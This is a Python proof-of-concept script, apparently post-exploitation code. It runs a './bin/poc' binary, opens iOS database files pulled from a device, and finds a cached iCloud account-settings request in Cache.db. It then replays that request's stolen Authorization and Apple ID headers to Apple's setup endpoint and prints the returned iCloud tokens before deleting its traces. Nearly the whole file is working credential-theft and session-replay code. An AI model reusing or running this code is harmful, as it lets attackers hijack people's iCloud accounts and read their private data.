import sqlite3
import re
import plistlib
from pathlib import Path, PosixPath

import requests


API_END = 'https://setup.icloud.com/setup/get_account_settings'


class Work(object):
    def __init__(self, idx):
        self.idx = Path(idx)
        self.path = self.idx.parent
        self.prefix = self.idx.with_suffix('').name

    def run(self):
        with self.idx.open('r') as fp:
            for line in fp:
                self.query(line)

    def query(self, line):
        remote = line[line.rfind('/') + 1:-1]
        suffix = line[:line.find(' ')]
        output = '%s_0%s' % (self.prefix, suffix)
        local = (self.path / output).with_suffix('.db')

        with sqlite3.connect(local) as conn:
            if remote == 'Cache.db':
                self.query_cache(conn)
            elif remote == 'AddressBook.sqlitedb':
                self.query_address(conn)

    def query_cache(self, conn: sqlite3.Connection):
        sql = '''
select cfurl_cache_response.entry_ID, 
    cfurl_cache_response.request_key,
    cfurl_cache_response.time_stamp,
    cfurl_cache_receiver_data.receiver_data,
    cfurl_cache_blob_data.response_object,
    cfurl_cache_blob_data.request_object,
    cfurl_cache_blob_data.proto_props,
    cfurl_cache_blob_data.user_info
    from cfurl_cache_response
    left outer join cfurl_cache_receiver_data on cfurl_cache_response.entry_ID == cfurl_cache_receiver_data.entry_ID
    left outer join cfurl_cache_blob_data on cfurl_cache_response.entry_ID == cfurl_cache_blob_data.entry_ID
    where cfurl_cache_response.request_key == '%s'
''' % API_END
        cursor = conn.execute(sql)
        for row in cursor:
            eid, url, timestamp, data, resp, req, proto, user = row

            self.icloud(plistlib.loads(req))
            continue

            from pprint import pprint
            print(url, timestamp)
            print(data)

            if resp:
                pprint(plistlib.loads(resp))
            if req:
                pprint(plistlib.loads(req))
            if proto:
                pprint(plistlib.loads(proto))
            if user:
                pprint(plistlib.loads(user))

    def icloud(self, data):
        # lazy unarchive
        headers = None
        body = None
        for item in data['Array']:
            if isinstance(item, dict) and 'Authorization' in item:
                headers = item
            elif isinstance(item, list):
                first = item[0]
                if isinstance(first, bytes):
                    body = first

        if headers and body:
            # del headers['__hhaa__']
            required = set(['Authorization', 'Content-Type', 'X-Apple-ADSID',
                            'X-Apple-I-Repair', 'X-MMe-Client-Info', 'X-MMe-Country', 'X-MMe-Language'])
            filtered_headers = {key: value for key,
                                value in headers.items() if key in required}
            response = requests.post(
                API_END, headers=filtered_headers, data=body)
            if response.status_code == 200:
                config = plistlib.loads(response.content)
                # tokens here
                print('here you go')
                import pprint
                pprint.pprint(config)
                return

            print("error, status code = %d" % response.status_code)
        print('failed to parse database')

    def query_address(self, conn: sqlite3.Connection):
        # todo: handle other databases
        pass

    def cleanup(self):
        import shutil
        shutil.rmtree(self.path)


if __name__ == "__main__":
    import subprocess
    idx = subprocess.check_output('./bin/poc').decode().strip()
    w = Work(idx)
    w.run()
    w.cleanup()
